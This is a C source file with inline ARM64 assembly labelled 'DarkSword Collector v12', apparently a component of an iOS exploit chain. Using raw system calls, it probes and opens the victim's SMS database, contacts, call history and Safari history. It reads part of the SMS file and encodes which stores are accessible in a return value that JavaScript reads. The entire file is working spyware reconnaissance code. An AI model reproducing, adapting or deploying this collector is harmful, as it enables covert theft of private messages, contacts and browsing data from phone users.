/**
 * DarkSword Collector v12 - Return value encoding
 * Returns file size as int, JS reads via caller return value
 * Stack-only, no globals, raw syscalls only
 */

static int _strlen(const char *s) { int n=0; while(s[n]) n++; return n; }

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6
#define SYS_write 4

/* ds_start returns:
 *   bits 0-15:  SMS file size (0 if failed)
 *   bit 16:     SMS accessible flag
 *   bit 17:     Contacts accessible flag
 *   bit 18:     CallHistory accessible flag
 *   bit 19:     Safari accessible flag
 */
int ds_start(void) {
    int result = 0;

    /* SMS */
    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/SMS/sms.db", 0);
    if (fd >= 0) {
        char data[64];
        int n = (int)_svc3(SYS_read, fd, (long)data, sizeof(data)-1);
        _svc1(SYS_close, fd);
        if (n < 0) n = 0;
        result |= (1 << 16); /* accessible flag */
        result |= (n & 0xFFFF); /* size */
    }

    /* Contacts */
    fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/AddressBook/AddressBook.sqlitedb", 0);
    if (fd >= 0) { result |= (1 << 17); _svc1(SYS_close, fd); }

    /* CallHistory */
    fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/CallHistoryDB/CallHistory.storedata", 0);
    if (fd >= 0) { result |= (1 << 18); _svc1(SYS_close, fd); }

    /* Safari */
    fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/Safari/History.db", 0);
    if (fd >= 0) { result |= (1 << 19); _svc1(SYS_close, fd); }

    return result;
}
